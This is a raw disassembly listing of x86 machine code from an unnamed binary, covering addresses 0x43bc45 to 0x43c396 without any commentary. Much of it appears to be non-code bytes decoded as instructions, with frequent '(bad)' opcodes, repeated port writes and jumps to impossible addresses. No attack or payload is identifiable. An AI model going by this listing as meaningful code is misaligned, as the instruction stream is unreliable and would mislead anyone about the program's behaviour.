  43bc45:	add    ch,BYTE PTR [esi]
  43bc47:	pop    es
  43bc48:	pushf  
  43bc49:	add    ch,BYTE PTR [edx]
  43bc4b:	pop    es
  43bc4c:	mov    WORD PTR [edx],es
  43bc4e:	es pop es
  43bc50:	mov    WORD PTR [edx],es
  43bc52:	and    al,BYTE PTR [edi]
  43bc54:	pop    esp
  43bc55:	add    bl,BYTE PTR [esi]
  43bc57:	pop    es
  43bc58:	pop    esp
  43bc59:	add    bl,BYTE PTR [edx]
  43bc5b:	pop    es
  43bc5c:	dec    esp
  43bc5d:	add    dl,BYTE PTR [esi]
  43bc5f:	pop    es
  43bc60:	dec    esp
  43bc61:	add    dl,BYTE PTR [edx]
  43bc63:	pop    es
  43bc64:	pop    esp
  43bc65:	add    cl,BYTE PTR [esi]
  43bc67:	pop    es
  43bc68:	pop    esp
  43bc69:	add    cl,BYTE PTR [edx]
  43bc6b:	pop    es
  43bc6c:	dec    esp
  43bc6d:	add    al,BYTE PTR [esi]
  43bc6f:	pop    es
  43bc70:	dec    esp
  43bc71:	add    al,BYTE PTR [edx]
  43bc73:	pop    es
  43bc74:	sbb    al,0x2
  43bc76:	inc    BYTE PTR [esi]
  43bc78:	sbb    al,0x2
  43bc7a:	cli    
  43bc7b:	push   es
  43bc7c:	add    BYTE PTR [eax],al
  43bc7e:	add    BYTE PTR [eax],al
  43bc80:	add    BYTE PTR [edx+eax*1],cl
  43bc83:	test   BYTE PTR [esi],0x75
  43bc86:	jmp    0x43bc84
  43bc88:	cmc    
  43bc89:	jnp    0x43bc76
  43bc8b:	cld    
  43bc8c:	icebp  
  43bc8d:	jae    0x43bc7a
  43bc8f:	cld    
  43bc90:	in     eax,dx
  43bc91:	jnp    0x43bc7e
  43bc93:	cld    
  43bc94:	jmp    0xe640a80c
  43bc99:	jnp    0x43bc86
  43bc9b:	cld    
  43bc9c:	loope  0x43bd11
  43bc9e:	jmp    0x43bc9c
  43bca0:	fnstsw WORD PTR [ebx-0x15]
  43bca3:	cld    
  43bca4:	fnstenv [ebx-0x15]
  43bca7:	cld    
  43bca8:	aad    0x7b
  43bcaa:	jmp    0x43bca8
  43bcac:	shl    DWORD PTR [ebx-0x15],1
  43bcaf:	cld    
  43bcb0:	int    0x7b
  43bcb2:	jmp    0x43bcb0
  43bcb4:	test   BYTE PTR [ecx-0x15],dh
  43bcb7:	cld    
  43bcb8:	cmp    BYTE PTR [ecx-0x15],0xfc
  43bcbc:	jl     0x43bd2f
  43bcbe:	jmp    0x43bcbc
  43bcc0:	mov    ebp,0xb9fceb7b
  43bcc5:	jae    0x43bcb2
  43bcc7:	cld    
  43bcc8:	mov    ch,0x7b
  43bcca:	jmp    0x43bcc8
  43bccc:	mov    cl,0x73
  43bcce:	jmp    0x43bccc
  43bcd0:	lods   eax,DWORD PTR ds:[esi]
  43bcd1:	jnp    0x43bcbe
  43bcd3:	cld    
  43bcd4:	test   eax,0xa5fceb73
  43bcd9:	jnp    0x43bcc6
  43bcdb:	cld    
  43bcdc:	mov    eax,ds:0x9dfceb73
  43bce1:	jnp    0x43bcce
  43bce3:	cld    
  43bce4:	cdq    
  43bce5:	add    BYTE PTR [eax],al
  43bce7:	add    BYTE PTR [eax],al
  43bce9:	add    BYTE PTR [ebx-0x15],dh
  43bcec:	cld    
  43bced:	xchg   ebp,eax
  43bcee:	jnp    0x43bcdb
  43bcf0:	cld    
  43bcf1:	xchg   ecx,eax
  43bcf2:	jae    0x43bcdf
  43bcf4:	cld    
  43bcf5:	lea    edi,[ebx-0x15]
  43bcf8:	cld    
  43bcf9:	mov    DWORD PTR [ebx-0x15],esi
  43bcfc:	cld    
  43bcfd:	test   DWORD PTR [ebx-0x15],edi
  43bd00:	cld    
  43bd01:	xor    DWORD PTR [ebx+0x2],0x4a303e7
  43bd08:	out    0x3,eax
  43bd0a:	lahf   
  43bd0b:	add    al,0xe7
  43bd0d:	add    ecx,DWORD PTR [ebx-0x78fc18fc]
  43bd13:	add    al,0xe7
  43bd15:	add    edx,DWORD PTR [ebx-0x70fc18fc]
  43bd1b:	add    al,0xe7
  43bd1d:	add    ebx,DWORD PTR [ebx+0x4]
  43bd20:	out    0x3,eax
  43bd22:	push   edi
  43bd23:	add    al,0xe7
  43bd25:	add    eax,DWORD PTR [ebx+0x4]
  43bd28:	out    0x3,eax
  43bd2a:	aas    
  43bd2b:	add    al,0xe7
  43bd2d:	add    ebp,DWORD PTR [ebx]
  43bd2f:	add    al,0xe7
  43bd31:	add    esp,DWORD PTR [edi]
  43bd33:	add    al,0xe7
  43bd35:	add    esi,DWORD PTR [ebx]
  43bd37:	add    al,0xe7
  43bd39:	add    esi,DWORD PTR [eax+0x6]
  43bd3c:	out    0x3,eax
  43bd3e:	je     0x43bd46
  43bd40:	out    0x3,eax
  43bd42:	test   al,0x0
  43bd44:	out    0x3,eax
  43bd46:	pushf  
  43bd47:	add    bh,ah
  43bd49:	add    ebx,DWORD PTR [edi+0x4]
  43bd4c:	out    0x3,eax
  43bd4e:	add    BYTE PTR [eax],al
  43bd50:	add    BYTE PTR [eax],al
  43bd52:	add    BYTE PTR [ebx+0x4],cl
  43bd55:	out    0x3,eax
  43bd57:	inc    edi
  43bd58:	add    al,0xe7
  43bd5a:	add    edx,DWORD PTR [ebx+0x4]
  43bd5d:	out    0x3,eax
  43bd5f:	dec    edi
  43bd60:	add    al,0xe7
  43bd62:	add    ebx,DWORD PTR [ebx-0x68fc18fc]
  43bd68:	add    al,0xe7
  43bd6a:	add    eax,DWORD PTR [ebx+0x7f03e704]
  43bd70:	add    al,0xe7
  43bd72:	add    ebp,DWORD PTR [ebx+0x4]
  43bd75:	out    0x3,eax
  43bd77:	addr16 add al,0xe7
  43bd7a:	add    esi,DWORD PTR [ebx+0x4]
  43bd7d:	out    0x3,eax
  43bd7f:	outs   dx,DWORD PTR ds:[esi]
  43bd80:	add    al,0x0
  43bd82:	jmp    0xe945c1fd
  43bd87:	jbe    0x43bd89
  43bd89:	add    ch,cl
  43bd8b:	jbe    0x43bd89
  43bd8d:	add    ch,cl
  43bd8f:	jbe    0x43bd89
  43bd91:	add    ch,cl
  43bd93:	jbe    0x43bd89
  43bd95:	add    ch,cl
  43bd97:	jbe    0x43bd89
  43bd99:	add    ch,cl
  43bd9b:	jbe    0x43bd89
  43bd9d:	add    ch,cl
  43bd9f:	jbe    0x43bd89
  43bda1:	add    ch,cl
  43bda3:	jbe    0x43bd89
  43bda5:	add    ch,cl
  43bda7:	jbe    0x43bd89
  43bda9:	add    ch,cl
  43bdab:	jbe    0x43bd89
  43bdad:	add    ch,cl
  43bdaf:	jbe    0x43bd89
  43bdb1:	add    ch,cl
  43bdb3:	jbe    0x43bd89
  43bdb5:	add    ch,cl
  43bdb7:	add    BYTE PTR [eax],al
  43bdb9:	add    BYTE PTR [eax],al
  43bdbb:	add    BYTE PTR [esi-0x30],dh
  43bdbe:	add    ch,cl
  43bdc0:	jbe    0x43bd8e
  43bdc2:	add    ch,cl
  43bdc4:	jbe    0x43bd8e
  43bdc6:	add    ch,cl
  43bdc8:	jbe    0x43bd8e
  43bdca:	add    ch,cl
  43bdcc:	jbe    0x43bd8e
  43bdce:	add    ch,cl
  43bdd0:	jbe    0x43bd8e
  43bdd2:	add    ch,cl
  43bdd4:	jbe    0x43bd8e
  43bdd6:	add    ch,cl
  43bdd8:	jbe    0x43bd8e
  43bdda:	add    ch,cl
  43bddc:	jbe    0x43bd8e
  43bdde:	add    ch,cl
  43bde0:	jbe    0x43bd8e
  43bde2:	add    ch,cl
  43bde4:	jbe    0x43bd8e
  43bde6:	add    ch,cl
  43bde8:	jbe    0x43bd8e
  43bdea:	add    ch,cl
  43bdec:	jbe    0x43bd8e
  43bdee:	add    ch,cl
  43bdf0:	jbe    0x43bd8e
  43bdf2:	add    ch,cl
  43bdf4:	jbe    0x43bd8e
  43bdf6:	add    ch,cl
  43bdf8:	jbe    0x43bd8e
  43bdfa:	add    ch,cl
  43bdfc:	jbe    0x43bd8e
  43bdfe:	add    al,BYTE PTR [eax]
  43be00:	dec    esp
  43be01:	dec    DWORD PTR [ecx-0x7a00b3fb]
  43be07:	add    eax,0x581ff1c
  43be0c:	sbb    al,0xff
  43be0e:	jge    0x43be15
  43be10:	or     al,0xff
  43be12:	jns    0x43be19
  43be14:	or     al,0xff
  43be16:	jne    0x43be1d
  43be18:	sbb    al,0xff
  43be1a:	jno    0x43be21
  43be1c:	sbb    al,0xff
  43be1e:	ins    DWORD PTR es:[edi],dx
  43be1f:	add    eax,0x0
  43be24:	add    BYTE PTR [edi+edi*8],cl
  43be27:	imul   eax,DWORD PTR ds:0x565ff0c,0x561fedc
  43be31:	fdiv   st(6),st
  43be33:	pop    ebp
  43be34:	add    eax,0x559fecc
  43be39:	int3   
  43be3a:	(bad)  
  43be3b:	push   ebp
  43be3c:	add    eax,0x551fedc
  43be41:	fdiv   st(6),st
  43be43:	dec    ebp
  43be44:	add    eax,0x549fecc
  43be49:	int3   
  43be4a:	inc    BYTE PTR [ebp+0x5]
  43be4d:	pushf  
  43be4e:	inc    BYTE PTR [ecx+0x5]
  43be51:	pushf  
  43be52:	(bad)  
  43be53:	cmp    eax,0x39fe8c05
  43be58:	add    eax,0x535fe8c
  43be5d:	pushf  
  43be5e:	(bad)  
  43be5f:	xor    DWORD PTR ds:0x52dfe9c,eax
  43be65:	mov    esi,?
  43be67:	sub    DWORD PTR ds:0x525fe8c,eax
  43be6d:	pop    esp
  43be6e:	push   es
  43be6f:	and    al,BYTE PTR ds:0x51e065c
  43be75:	dec    esp
  43be76:	push   es
  43be77:	sbb    al,BYTE PTR ds:0x516064c
  43be7d:	jne    0x43be6a
  43be7f:	cld    
  43be80:	adc    eax,0x11fceb70
  43be85:	js     0x43be72
  43be87:	cld    
  43be88:	or     eax,0x0
  43be8d:	add    BYTE PTR [eax-0x15],dh
  43be90:	cld    
  43be91:	or     DWORD PTR [eax-0x15],edi
  43be94:	cld    
  43be95:	add    eax,0x1fceb70
  43be9a:	js     0x43be87
  43be9c:	cld    
  43be9d:	std    
  43be9e:	jno    0x43be8b
  43bea0:	cld    
  43bea1:	stc    
  43bea2:	jns    0x43be8f
  43bea4:	cld    
  43bea5:	cmc    
  43bea6:	jno    0x43be93
  43bea8:	cld    
  43bea9:	icebp  
  43beaa:	jns    0x43be97
  43beac:	cld    
  43bead:	in     eax,dx
  43beae:	jno    0x43be9b
  43beb0:	cld    
  43beb1:	jmp    0xe640aa2f
  43beb6:	jno    0x43bea3
  43beb8:	cld    
  43beb9:	loope  0x43bf34
  43bebb:	jmp    0x43beb9
  43bebd:	fnsave [ecx-0x15]
  43bec0:	cld    
  43bec1:	fnstcw WORD PTR [ecx-0x15]
  43bec4:	cld    
  43bec5:	aad    0x71
  43bec7:	jmp    0x43bec5
  43bec9:	sar    DWORD PTR [ecx-0x15],1
  43becc:	cld    
  43becd:	int    0x71
  43becf:	jmp    0x43becd
  43bed1:	leave  
  43bed2:	jns    0x43bebf
  43bed4:	cld    
  43bed5:	lds    esi,FWORD PTR [ecx-0x15]
  43bed8:	cld    
  43bed9:	sar    DWORD PTR [ecx-0x15],0xfc
  43bedd:	mov    ebp,0xb9fceb71
  43bee2:	jns    0x43becf
  43bee4:	cld    
  43bee5:	mov    ch,0x71
  43bee7:	jmp    0x43bee5
  43bee9:	mov    cl,0x79
  43beeb:	jmp    0x43bee9
  43beed:	lods   eax,DWORD PTR ds:[esi]
  43beee:	jno    0x43bedb
  43bef0:	cld    
  43bef1:	test   eax,0x0
  43bef6:	add    BYTE PTR [ecx-0x15],bh
  43bef9:	cld    
  43befa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43befb:	jno    0x43bee8
  43befd:	cld    
  43befe:	mov    eax,ds:0x3e70279
  43bf03:	sti    
  43bf04:	std    
  43bf05:	out    0x3,al
  43bf07:	out    dx,eax
  43bf08:	std    
  43bf09:	out    0x3,al
  43bf0b:	jecxz  0x43bf0a
  43bf0d:	out    0x3,al
  43bf0f:	out    0xfd,eax
  43bf11:	out    0x3,al
  43bf13:	jmp    0x43bf12
  43bf15:	out    0x3,al
  43bf17:	(bad)  
  43bf18:	std    
  43bf19:	out    0x3,al
  43bf1b:	repz std 
  43bf1d:	out    0x3,al
  43bf1f:	idiv   ebp
  43bf21:	out    0x3,al
  43bf23:	fwait
  43bf24:	(bad)  
  43bf25:	out    0x3,al
  43bf27:	(bad)  
  43bf28:	(bad)  
  43bf29:	out    0x3,al
  43bf2b:	cmp    esi,0xffffffe6
  43bf2e:	add    eax,DWORD PTR [edi-0x74fc1902]
  43bf34:	(bad)  
  43bf35:	out    0x3,al
  43bf37:	pop    edi
  43bf38:	(bad)  
  43bf39:	out    0x3,al
  43bf3b:	push   ebx
  43bf3c:	(bad)  
  43bf3d:	out    0x3,al
  43bf3f:	push   edi
  43bf40:	(bad)  
  43bf41:	out    0x3,al
  43bf43:	cmp    edi,esi
  43bf45:	out    0x3,al
  43bf47:	das    
  43bf48:	(bad)  
  43bf49:	out    0x3,al
  43bf4b:	and    edi,esi
  43bf4d:	out    0x3,al
  43bf4f:	daa    
  43bf50:	(bad)  
  43bf51:	out    0x3,al
  43bf53:	sub    edi,esi
  43bf55:	out    0x3,al
  43bf57:	aas    
  43bf58:	(bad)  
  43bf59:	out    0x3,al
  43bf5b:	add    BYTE PTR [eax],al
  43bf5d:	add    BYTE PTR [eax],al
  43bf5f:	add    BYTE PTR [ebx],dh
  43bf61:	(bad)  
  43bf62:	out    0x3,al
  43bf64:	aaa    
  43bf65:	(bad)  
  43bf66:	out    0x3,al
  43bf68:	pop    ebx
  43bf69:	(bad)  
  43bf6a:	out    0x3,al
  43bf6c:	dec    edi
  43bf6d:	(bad)  
  43bf6e:	out    0x3,al
  43bf70:	inc    ebx
  43bf71:	(bad)  
  43bf72:	out    0x3,al
  43bf74:	inc    edi
  43bf75:	(bad)  
  43bf76:	out    0x3,al
  43bf78:	dec    ebx
  43bf79:	(bad)  
  43bf7a:	out    0x3,al
  43bf7c:	lahf   
  43bf7d:	(bad)  
  43bf7e:	(bad)  
  43bf7f:	call   0xe947dffa
  43bf84:	jbe    0x43bfaa
  43bf86:	add    al,0xe9
  43bf88:	jbe    0x43bfa2
  43bf8a:	add    al,0xe9
  43bf8c:	jbe    0x43bfaa
  43bf8e:	add    al,0xe9
  43bf90:	jbe    0x43bfa2
  43bf92:	add    al,0xe9
  43bf94:	jbe    0x43bfaa
  43bf96:	add    al,0xe9
  43bf98:	jbe    0x43bfa2
  43bf9a:	add    al,0xe9
  43bf9c:	jbe    0x43bfaa
  43bf9e:	add    al,0xe9
  43bfa0:	jbe    0x43bfa2
  43bfa2:	add    al,0xe9
  43bfa4:	jbe    0x43bfaa
  43bfa6:	add    al,0xe9
  43bfa8:	jbe    0x43bfa2
  43bfaa:	cld    
  43bfab:	call   0xe940bc26
  43bfb0:	jbe    0x43bfa2
  43bfb2:	cld    
  43bfb3:	call   0xe940b42e
  43bfb8:	jbe    0x43bfa2
  43bfba:	cld    
  43bfbb:	call   0xe940ac36
  43bfc0:	jbe    0x43bfa2
  43bfc2:	cld    
  43bfc3:	call   0x43bfc8
  43bfc8:	add    BYTE PTR [esi-0x1c],dh
  43bfcb:	cld    
  43bfcc:	call   0xe9409847
  43bfd1:	jbe    0x43bfaf
  43bfd3:	cld    
  43bfd4:	call   0xe940904f
  43bfd9:	jbe    0x43bfaf
  43bfdb:	cld    
  43bfdc:	call   0xe9408857
  43bfe1:	jbe    0x43bffa
  43bfe3:	(bad)  
  43bfe4:	call   0xe942db5f
  43bfe9:	jbe    0x43bffa
  43bfeb:	(bad)  
  43bfec:	call   0xe942d367
  43bff1:	jbe    0x43bffb
  43bff3:	(bad)  
  43bff4:	call   0xe942f46f
  43bff9:	jbe    0x43c036
  43bffb:	(bad)  
  43bffc:	dec    DWORD PTR [ebx+eax*1+0x35c00fd]
  43c003:	stc    
  43c004:	add    BYTE PTR [ebx+eax*1-0xb],bl
  43c008:	add    BYTE PTR [ebx+eax*1-0xf],cl
  43c00c:	add    BYTE PTR [ebx+eax*1-0x13],cl
  43c010:	add    BYTE PTR [ebx+eax*1-0x16],bl
  43c014:	add    BYTE PTR [ebx+eax*1-0x1b],bl
  43c018:	add    BYTE PTR [ebx+eax*1-0x1f],cl
  43c01c:	add    BYTE PTR [ebx+eax*1-0x23],cl
  43c020:	add    BYTE PTR [ebx+eax*1],bl
  43c023:	fld    DWORD PTR [eax]
  43c025:	sbb    al,0x3
  43c027:	aad    0x0
  43c029:	or     al,0x3
  43c02b:	rol    DWORD PTR [eax],1
  43c02d:	add    BYTE PTR [eax],al
  43c02f:	add    BYTE PTR [eax],al
  43c031:	add    BYTE PTR [ebx+eax*1],cl
  43c034:	int    0x0
  43c036:	sbb    al,0x3
  43c038:	retf   0x1c00
  43c03b:	add    eax,ebp
  43c03d:	add    BYTE PTR [ebx+eax*1],cl
  43c040:	rol    DWORD PTR [eax],0xc
  43c043:	add    edi,DWORD PTR [ebp-0x46fd2400]
  43c049:	add    ah,bl
  43c04b:	add    dh,BYTE PTR [ebp-0x4efd3400]
  43c051:	add    ah,cl
  43c053:	add    ch,BYTE PTR [ebp-0x56fd2400]
  43c059:	add    ah,bl
  43c05b:	add    ah,BYTE PTR [ebp-0x5efd3400]
  43c061:	add    ah,cl
  43c063:	add    bl,BYTE PTR [ebp+0x56029c00]
  43c069:	jmp    FWORD PTR [ecx]
  43c06b:	rol    BYTE PTR [edi+0x3d34af45],1
  43c071:	and    cl,BYTE PTR [edi+esi*1-0x183fdc3]
  43c078:	(bad)  
  43c079:	push   DWORD PTR [ebp-0x58]
  43c07c:	mov    edi,0xfce95501
  43c081:	push   esi
  43c083:	cmp    eax,0xdce83fcd
  43c088:	cmp    DWORD PTR [ebx+0x73],eax
  43c08b:	sub    eax,DWORD PTR [eax+eax*1]
  43c08e:	jne    0x43c0f0
  43c090:	rcr    BYTE PTR [edx+ebp*2],0x55
  43c094:	cmc    
  43c095:	mov    al,BYTE PTR [eax]
  43c097:	add    BYTE PTR [eax],al
  43c099:	add    BYTE PTR [eax],al
  43c09b:	jns    0x43c102
  43c09d:	(bad)  
  43c09e:	push   esi
  43c0a0:	stos   DWORD PTR es:[edi],eax
  43c0a1:	clc    
  43c0a2:	clc    
  43c0a3:	and    eax,0xc1f90569
  43c0a8:	in     eax,0x75
  43c0aa:	inc    ebx
  43c0ab:	push   esi
  43c0ac:	sar    BYTE PTR [edi-0x54ee34d8],1
  43c0b2:	jl     0x43c0ed
  43c0b4:	mov    ebp,0xeb6dbda7
  43c0b9:	cmp    DWORD PTR [ebx+0x6f],eax
  43c0bc:	jmp    0x43c0ba
  43c0be:	push   DWORD PTR [ebp+0x60]
  43c0c1:	rcr    BYTE PTR [edx+esi*2],0x8d
  43c0c5:	mov    esp,0xfd2451fe
  43c0ca:	push   DWORD PTR [ebp-0x7e]
  43c0cd:	mov    esp,0xd3ebeaff
  43c0d2:	int    0xea
  43c0d4:	cmp    bh,BYTE PTR [ebx+eax*2+0x6f]
  43c0d8:	push   0xdf49ff05
  43c0dd:	jge    0x43c122
  43c0df:	outs   dx,DWORD PTR ds:[esi]
  43c0e0:	jmp    0x7cf8:0x8e77f87d
  43c0e7:	xor    cl,ah
  43c0e9:	clc    
  43c0ea:	xchg   BYTE PTR [eax-0x1b],cl
  43c0ed:	inc    ebx
  43c0ee:	loopne 0x43c160
  43c0f0:	jmp    0xfffc:0xdb75030c
  43c0f7:	call   0x90b7abfe
  43c0fc:	cmc    
  43c0fd:	gs inc esp
  43c0ff:	add    BYTE PTR [eax],al
  43c101:	add    BYTE PTR [eax],al
  43c103:	add    BYTE PTR [ecx-0xb],dh
  43c106:	mov    dh,0x41
  43c108:	clc    
  43c109:	aas    
  43c10a:	push   es
  43c10b:	cmc    
  43c10c:	les    eax,FWORD PTR [edx-0x18]
  43c10f:	adc    BYTE PTR [ebp+0x3a],0xa8
  43c113:	sbb    al,0x68
  43c115:	mov    ch,BYTE PTR [ebx]
  43c117:	out    dx,al
  43c118:	and    ecx,eax
  43c11a:	xchg   DWORD PTR gs:[edx+eiz*1+0x23],esi
  43c11f:	jecxz  0x43c0f2
  43c121:	aas    
  43c122:	std    
  43c123:	add    dh,al
  43c125:	ds (bad) 
  43c127:	hlt    
  43c128:	add    al,0x42
  43c12a:	in     eax,0x80
  43c12c:	push   ebp
  43c12d:	std    
  43c12e:	outs   dx,DWORD PTR ds:[esi]
  43c12f:	mov    edi,0xf1fb8180
  43c134:	ja     0x43c1a5
  43c136:	fld    QWORD PTR [eax-0x7118f762]
  43c13c:	jbe    0x43c0bf
  43c13e:	stos   DWORD PTR es:[edi],eax
  43c13f:	jmp    0x87a982ba
  43c144:	je     0x43c168
  43c146:	sar    edi,cl
  43c148:	cmp    DWORD PTR [edi],0x80b9ffed
  43c14e:	ret    
  43c14f:	std    
  43c150:	sub    BYTE PTR [edi-0x1d],0x80
  43c154:	ss sbb ch,ah
  43c157:	inc    eax
  43c158:	int    0x5f
  43c15a:	sub    al,BYTE PTR ds:0xe9ab88dc
  43c160:	sar    DWORD PTR ds:0x213680c6,cl
  43c166:	in     eax,0x40
  43c168:	add    BYTE PTR [eax],al
  43c16a:	add    BYTE PTR [eax],al
  43c16c:	add    BYTE PTR [esi+edi*1+0x3f3840c6],bh
  43c173:	mov    BYTE PTR [ecx],0xf0
  43c176:	cmp    BYTE PTR [ebx+0x1],0x85
  43c17a:	outs   dx,DWORD PTR ds:[esi]
  43c17b:	add    bh,ch
  43c17d:	jle    0x43c155
  43c17f:	clc    
  43c180:	out    dx,al
  43c181:	jno    0x43c13a
  43c183:	out    0x2d,eax
  43c185:	ja     0x43c189
  43c187:	add    BYTE PTR [edx-0x701870b],ch
  43c18d:	repz sti 
  43c18f:	out    0xa3,eax
  43c191:	jno    0x43c18e
  43c193:	clc    
  43c194:	(bad)  
  43c195:	xor    edx,DWORD PTR [edi]
  43c197:	mov    ebp,0xf8f641d1
  43c19c:	jmp    0xfabf3756
  43c1a1:	ss jno 0x43c1a6
  43c1a4:	xchg   ecx,eax
  43c1a5:	push   ebp
  43c1a6:	idiv   al
  43c1a8:	jmp    0xca86bb62
  43c1ad:	mov    ch,0x75
  43c1af:	jnp    0x43c19c
  43c1b1:	push   esi
  43c1b2:	js     0x43c1b7
  43c1b4:	push   0xfffffff3
  43c1b6:	push   ss
  43c1b7:	add    ebp,DWORD PTR [edx-0x15e2c00b]
  43c1bd:	mov    ch,0x75
  43c1bf:	jnp    0x43c1ac
  43c1c1:	ss jno 0x43c1c7
  43c1c4:	push   0xffffffd3
  43c1c6:	push   ss
  43c1c7:	pop    es
  43c1c8:	sub    dh,ch
  43c1ca:	ja     0x43c1ca
  43c1cc:	or     dl,dh
  43c1ce:	add    BYTE PTR [ebp-0x5c],bh
  43c1d1:	add    BYTE PTR [eax],al
  43c1d3:	add    BYTE PTR [eax],al
  43c1d5:	add    BYTE PTR ds:0x336abd01,dl
  43c1db:	pop    ss
  43c1dc:	std    
  43c1dd:	sub    DWORD PTR [esi+0x7936f882],ecx
  43c1e3:	stc    
  43c1e4:	inc    edx
  43c1e5:	or     dh,BYTE PTR [esi*2+0x70b6da7b]
  43c1ec:	push   ds
  43c1ed:	es or  esi,esi
  43c1f0:	cmp    cl,ch
  43c1f2:	jbe    0x43c1f6
  43c1f4:	stc    
  43c1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c1f6:	aad    0x7e
  43c1f8:	inc    edx
  43c1f9:	add    BYTE PTR [edi+0x1908aeee],bh
  43c1ff:	xrelease xchg BYTE PTR [ebx],al
  43c202:	mov    WORD PTR [edx+0x308b04bf],es
  43c208:	mov    edi,0x1f9e45
  43c20d:	add    BYTE PTR [esp+edi*4-0x4490ba09],bl
  43c214:	jnp    0x43c293
  43c216:	pop    edi
  43c217:	ds ins DWORD PTR es:[edi],dx
  43c219:	and    edi,DWORD PTR [ebx]
  43c21b:	dec    ecx
  43c21c:	sbb    edi,esi
  43c21e:	xchg   ecx,eax
  43c21f:	sbb    al,0x80
  43c221:	jge    0x43c291
  43c223:	(bad)  
  43c225:	push   es
  43c226:	xor    al,0xa7
  43c228:	stc    
  43c229:	call   FWORD PTR [esp+edi*4-0x7d]
  43c22d:	inc    ebp
  43c22e:	aas    
  43c22f:	adc    BYTE PTR [esi-0x79f526f8],ch
  43c235:	add    ecx,DWORD PTR [esp+edi*2-0x48]
  43c239:	add    al,0x0
  43c23b:	add    BYTE PTR [eax],al
  43c23d:	add    BYTE PTR [eax],al
  43c23f:	sti    
  43c240:	int    0xbb
  43c242:	adc    DWORD PTR [ecx+0x1b],0xfffffff9
  43c246:	ret    0x49ab
  43c249:	sbb    edi,esi
  43c24b:	push   ecx
  43c24c:	sbb    al,0x80
  43c24e:	jge    0x43c2ce
  43c250:	(bad)  
  43c252:	push   es
  43c253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c254:	jg     0x43c24e
  43c256:	dec    DWORD PTR [esp+edi*4]
  43c259:	add    DWORD PTR [ebp+0x6f],0xf
  43c25d:	scas   al,BYTE PTR es:[edi]
  43c25e:	or     BYTE PTR [ecx+0xa],ch
  43c261:	xchg   BYTE PTR [ebx],al
  43c263:	fdivr  QWORD PTR [ebx-0x48]
  43c266:	add    al,0xab
  43c268:	into   
  43c269:	mov    ebx,0x1ffd0983
  43c26e:	jl     0x43c236
  43c270:	out    0xec,al
  43c272:	(bad)  
  43c273:	imul   edi,edi,0x7a
  43c276:	inc    ebp
  43c277:	jne    0x43c241
  43c279:	add    BYTE PTR [ebp-0x7020133],bh
  43c27f:	mov    dl,0x67
  43c281:	inc    edi
  43c282:	sbb    eax,0x7a812877
  43c287:	test   ax,0x277
  43c28b:	lea    esp,[eax-0x578afffd]
  43c291:	add    DWORD PTR [edx+0x56],0x387cc1e7
  43c298:	or     BYTE PTR [eax],cl
  43c29a:	mov    ebp,0x3211df6
  43c29f:	ss pop ebp
  43c2a1:	sub    BYTE PTR ds:0x0,0x0
  43c2a8:	mov    ch,0x36
  43c2aa:	push   es
  43c2ab:	call   0x409d40
  43c2b0:	les    edi,FWORD PTR ss:[ebx-0x3e56ad07]
  43c2b7:	out    0x6f,eax
  43c2b9:	xchg   ecx,eax
  43c2ba:	std    
  43c2bb:	clc    
  43c2bc:	not    BYTE PTR [esi]
  43c2be:	or     bh,ch
  43c2c0:	shr    ecx,0xe4
  43c2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c2c4:	xor    ecx,DWORD PTR [ecx-0x33e24303]
  43c2ca:	add    eax,DWORD PTR [eax]
  43c2cc:	jne    0x43c26a
  43c2ce:	add    DWORD PTR [edx+0x56],0x907cc1dc
  43c2d5:	loope  0x43c313
  43c2d7:	jae    0x43c349
  43c2d9:	pop    esp
  43c2da:	dec    eax
  43c2db:	sbb    eax,0x42821c6c
  43c2e0:	push   esi
  43c2e1:	out    0xc1,al
  43c2e3:	jl     0x43c355
  43c2e5:	loope  0x43c2f3
  43c2e7:	jae    0x43c359
  43c2e9:	pop    esp
  43c2ea:	dec    eax
  43c2eb:	sbb    eax,0x7a821c76
  43c2f0:	jae    0x43c2ed
  43c2f2:	jbe    0x43c2f7
  43c2f4:	test   BYTE PTR [edx],0xac
  43c2f7:	es jbe 0x43c2bf
  43c2fa:	gs dec eax
  43c2fc:	pusha  
  43c2fd:	sti    
  43c2fe:	and    eax,0xe8023f83
  43c303:	js     0x43c37c
  43c305:	fimul  DWORD PTR [eax+0x25f1ac01]
  43c30b:	jmp    0x43c30d
  43c30d:	add    BYTE PTR [eax],al
  43c30f:	add    BYTE PTR [eax],al
  43c311:	lods   al,BYTE PTR ds:[esi]
  43c312:	add    ah,bh
  43c314:	add    ebx,eax
  43c316:	sub    BYTE PTR [ebx+0x3],0x92
  43c31a:	jbe    0x43c305
  43c31c:	jmp    0x43c344
  43c31e:	lock fld DWORD PTR [ecx]
  43c321:	rol    BYTE PTR [edx+0x767a0353],0xe1
  43c328:	jmp    0x43c2e4
  43c32a:	lock rol DWORD PTR [ecx],0x28
  43c32e:	test   DWORD PTR [ebx],edi
  43c330:	push   es
  43c331:	test   DWORD PTR [edi-0x17],esi
  43c334:	jmp    0x43c2d4
  43c336:	lock test eax,0x4ada1001
  43c33c:	add    al,0x75
  43c33e:	add    ah,BYTE PTR [esi+0x2735bf85]
  43c344:	ja     0x43c3bd
  43c346:	fisubr DWORD PTR [esi+0x4]
  43c349:	jne    0x43c34d
  43c34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c34c:	test   DWORD PTR [edi+0x7676c704],ebp
  43c352:	test   DWORD PTR [ebx],ebp
  43c354:	and    eax,0x4765c574
  43c359:	jo     0x43c362
  43c35b:	lds    ecx,FWORD PTR es:[ecx-0x76ec1a91]
  43c362:	adc    bh,BYTE PTR [edi]
  43c364:	js     0x43c364
  43c366:	lock dec ecx
  43c368:	lea    esi,[edi]
  43c36a:	or     al,0xe8
  43c36c:	inc    esi
  43c36d:	mov    BYTE PTR [ebp-0x3a88db5d],al
  43c373:	inc    DWORD PTR [eax+0x0]
  43c376:	add    BYTE PTR [eax],al
  43c378:	add    BYTE PTR [eax],al
  43c37a:	dec    ebp
  43c37b:	in     eax,dx
  43c37c:	clc    
  43c37d:	add    BYTE PTR cs:[esi+edx*1-0x18],al
  43c382:	xor    ecx,DWORD PTR [edi]
  43c384:	jge    0x43c32a
  43c386:	cdq    
  43c387:	push   es
  43c388:	mov    ebp,0x401f3a6a
  43c38d:	xchg   esp,eax
  43c38e:	jl     0x43c36a
  43c390:	push   edx
  43c391:	jmp    0x6b00c60c
  43c396:	and    dh,al
